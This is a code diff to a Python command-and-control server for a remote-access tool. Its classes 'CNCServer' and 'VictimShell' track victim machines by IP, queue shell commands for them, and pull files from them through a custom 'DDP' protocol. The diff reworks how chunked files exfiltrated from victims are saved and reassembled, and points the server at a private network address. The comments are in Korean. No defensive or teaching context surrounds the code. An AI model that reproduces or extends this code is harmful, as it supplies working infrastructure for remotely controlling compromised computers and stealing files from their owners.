@@ -1,13 +1,16 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from collections import deque
 from datetime import datetime
+from os import path
 
 from customProtocol import DDP
 from logManager import Logger
+from seqFileManager import SEQManager
+from Exceptions import SEQNumError, SEQSaveError
 
 import threading
 import cmd
-import os
+
 
 class BaseShell(cmd.Cmd):
     '''base'''
@@ -103,18 +106,20 @@ class VictimShell(BaseShell):
         
         parsed_arg = arg.split(' ')
         if len(parsed_arg) == 1:
-            if os.path.isfile(FILE_PATH + parsed_arg[0]):
+            if path.isfile(FILE_PATH + parsed_arg[0]):
                 print('{} is already exit in FILE_PATH'.format(parsed_arg[0]))
                 return
         elif len(parsed_arg) == 2:
-            if os.path.isfile(FILE_PATH + parsed_arg[1]):
+            if path.isfile(FILE_PATH + parsed_arg[1]):
                 print('{} is already exit in FILE_PATH'.format(parsed_arg[1]))
                 return
         else:
             return self.default('gf ' + arg)
 
+        with open(FILE_PATH+parsed_arg[-1], 'wb'):
+            pass
 
-        # victim_table[self.targetIP]['command'].append('[gf {}]'.format(arg))
+        victim_table[self.targetIP]['command'].append('[gf {}]'.format(arg))
         
 
 
@@ -182,9 +187,10 @@ class CNCServer(BaseHTTPRequestHandler):
 
     # ftp request 응답
     def _response_ftp_request(self, data, victim_ip, file_name):
+                    
         global victim_table
 
-        victim_table[victim_ip]['fileName'].append(file_name)
+        victim_table[victim_ip]['seqName'].append(file_name)
 
         self._response_writer(DDP.raw('FTP_REQUEST', 0, data.encode(ENCODING)))
 
@@ -212,41 +218,59 @@ class CNCServer(BaseHTTPRequestHandler):
         if not victim_name:
             victim_name = victim_ip
 
-        victim_table[victim_ip] = {'name' : victim_name, 'command' : deque(), 'sequence' : {}, 'fileName' : deque()}
+        victim_table[victim_ip] = {'name' : victim_name, 'command' : deque(), 'seqName' : deque()}
 
     # sequence 딕셔너리에 데이터 저장
-    def _gather_seq_data(self, victim_ip, seq, data):
-        global victim_table
-        victim_table[victim_ip]['sequence'][seq] = data
+    def _gather_seq_data(self, victim_ip, seq, data, isFTP=True):
+        if not isFTP and seq == 1:
+            global victim_table
+            victim_table[victim_ip]['seqName'].appendleft(str(victim_ip) + datetime.now().strftime('_%Y%m%d-%H%M%S.seq'))
+
+        seq_name = ""
+        try:
+            seq_name = victim_table[victim_ip]['seqName'][0]
+
+            #만약 시퀀스 명이 fullpath이면 \ 를 제거
+            if '\\' in seq_name:
+                seq_name = seq_name.split('\\')[-1]
+
+            SEQManager.saveSeqData(seq_name, seq, data)
+        except SEQNumError as seq_e:
+            Logger.error('seq gather error : {}'.format(str(seq_e)))
+            return False
+        except Exception as e:
+            Logger.error('seq gather error : {}'.format(str(e)))
+            return False
+
+        if not seq_name:
+            Logger.error('seq name is not exist in queue..!')
+            return False
+
         Logger.info('{} seq datas in'.format(seq))
+
+        return True
     
     # sequence 딕셔너리에 쌓인 데이터 조립
-    def _merge_seq_data(self, victim_ip) -> bytes:
-        global victim_table
+    def _merge_seq_data(self, victim_ip, isFTP : bool) -> bytes:
+        seq_name = ""
+        try:
+            if isFTP:
+                seq_name = victim_table[victim_ip]['seqName'][0]
+            else:
+                seq_name = victim_table[victim_ip]['seqName'].popleft()
 
-        sorted_key = sorted(victim_table[victim_ip]['sequence'].keys())
+            #만약 시퀀스 명이 fullpath이면 \ 를 제거
+            if '\\' in seq_name:
+                seq_name = seq_name.split('\\')[-1]
 
-        merged_data = b''
-
-        next_seq = 1
-
-        for key in sorted_key:
-            if key == 0:
-                continue
-
-            if next_seq != key:
-                Logger.error('{} seq merge error : {}'.format(victim_ip, victim_table[victim_ip]['sequence']))
-                victim_table[victim_ip]['sequence'] = {}
-                return b'SEQ_ERROR'
-        
-            merged_data += victim_table[victim_ip]['sequence'][key]
-            next_seq += key
-
-        merged_data += victim_table[victim_ip]['sequence'][0]
-
-        victim_table[victim_ip]['sequence'] = {}
-
-        return merged_data
+            SEQManager.mergeSeqData(seq_name, FILE_PATH)
+        except SEQSaveError as seq_e:
+            Logger.error('seq merge error : {}'.format(str(seq_e)))
+            return False
+        except Exception as e:
+            Logger.error('seq merge error : {}'.format(str(e)))
+            return False
+        return True
 
     def do_POST(self):
         # body와 ip get
@@ -265,9 +289,11 @@ class CNCServer(BaseHTTPRequestHandler):
             self._response_ddp_error('invalid ddp data')
             return
 
-        # ftp 응답의 경우 로깅 X
-        if parsed_data['type'] != 'FTP_RESPONSE':
+        # ftp나 시퀀스 응답의 경우 로깅 X
+        if parsed_data['type'] != 'FTP_RESPONSE' and parsed_data['sequence'] == 0:
             self._logging_parsed_data(victim_ip, parsed_data)
+        else:
+            Logger.info('{}-{} : receive seq data'.format(victim_ip, parsed_data['type']))
         
 
         # victim_table에 ip가 존재하지 않다면 추가 작업
@@ -275,25 +301,26 @@ class CNCServer(BaseHTTPRequestHandler):
             self._append_victim(victim_ip=victim_ip)
 
         ddp_data = parsed_data['data']
+        
+        isFtp = True if parsed_data['type'] == 'FTP_RESPONSE' else False
 
         # sequence가 0이 아니라면 sequence 딕셔너리에 데이터 모으기
-        if parsed_data['sequence'] != 0:
-            self._gather_seq_data(victim_ip, parsed_data['sequence'], ddp_data)
+        if parsed_data['sequence'] != 0 and parsed_data['sequence'] != 0xffffffff:
+
+            if not self._gather_seq_data(victim_ip, parsed_data['sequence'], ddp_data, isFtp):
+                self._response_ddp_error('seq saving error')
+                return
             self._response_ack()
             return
 
         # sequence가 0이면서 sequence 딕셔너리에 값이 존재한다면 data merge 수행
-        if len(victim_table[victim_ip]['sequence']) > 0:
-            self._gather_seq_data(victim_ip, parsed_data['sequence'], ddp_data)
-            ddp_data = self._merge_seq_data(victim_ip)
-
-            # 잘못된 seq 발생시
-            if ddp_data == b'SEQ_ERROR':
+        if parsed_data['sequence'] == 0xffffffff:
+            if not self._gather_seq_data(victim_ip, parsed_data['sequence'], ddp_data, isFtp):
+                self._response_ddp_error('seq saving error')
+                return 
+            
+            if not self._merge_seq_data(victim_ip, isFtp):
                 self._response_ddp_error('seq merge error')
-
-                # 만약 파일 데이터를 받는 중 발생한 seq 에러라면 큐에서 파일명 제거
-                if parsed_data['type'] == 'FTP_RESPONSE' and victim_table[victim_ip]['fileName']:
-                    victim_table[victim_ip]['fileName'].popleft()
                 return
 
         # type별 함수 호출
@@ -314,9 +341,8 @@ class CNCServer(BaseHTTPRequestHandler):
                 # gf 명령어 처리
                 elif data.startswith('[gf'):
                     file_name = data.split(' ')
-                    file_name = file_name[len(file_name)-1][:-1]
 
-                    self._response_ftp_request(file_name, victim_ip, file_name)
+                    self._response_ftp_request(file_name[len(file_name)-2], victim_ip, file_name[len(file_name)-1][:-1])
                     return
             # shell 명령어 처리
             else:
@@ -337,15 +363,15 @@ class CNCServer(BaseHTTPRequestHandler):
         fileName = ""
 
         try:
-            fileName = victim_table[victim_ip]['fileName'].popleft()
+            fileName = victim_table[victim_ip]['seqName'].popleft()
 
             #만약 파일명이 fullpath이면 \ 를 제거
             if '\\' in fileName:
                 fileName = fileName.split('\\')[-1]
 
-            with open(FILE_PATH+fileName, 'wb') as fw:
-                fw.write(ddp_data)
-            
+            if not path.isfile(FILE_PATH+fileName):
+                raise SEQSaveError('SEQSaveError : file not found')
+
             Logger.info('{} file saved'.format(fileName))
             self._response_ack()
         except Exception as e:
@@ -353,15 +379,16 @@ class CNCServer(BaseHTTPRequestHandler):
             if not fileName:
                 Logger.error('{0} fileName Queue is empty!'.format(victim_ip))
                 return
-            Logger.error('{0} save error : {1}'.format(fileName, str(e)))
+            Logger.error('{0} seq save error : {1}'.format(fileName, str(e)))
         
 LOG_PATH = Logger.LOG_PATH
 FILE_PATH = './file/'
+TMP_FILE_PATH = SEQManager.TMP_FILE_PATH
 
 ENCODING = 'cp949'
-SERVER_INFO = ('127.0.0.1', 80)
+SERVER_INFO = ('172.17.254.126', 80)
 
-victim_table = {} # {ip : {name : [name], command : [command queue], sequence : {seq num, seq data}, fileName : [fileName queue]}}
+victim_table = {} # {ip : {name : [name], command : [command queue], seqName : [seqName queue]}}
 
 
 # http server
@@ -376,6 +403,7 @@ except Exception as e:
     exit(0)
 
 
+# TODO 패킷 전송중 클라이언트가 연결을 끊을 경우 발생하는 Broken PIPE 예외처리
 if __name__ == '__main__':
     try:
         EntryShell().cmdloop() # 대화형 쉘 실행
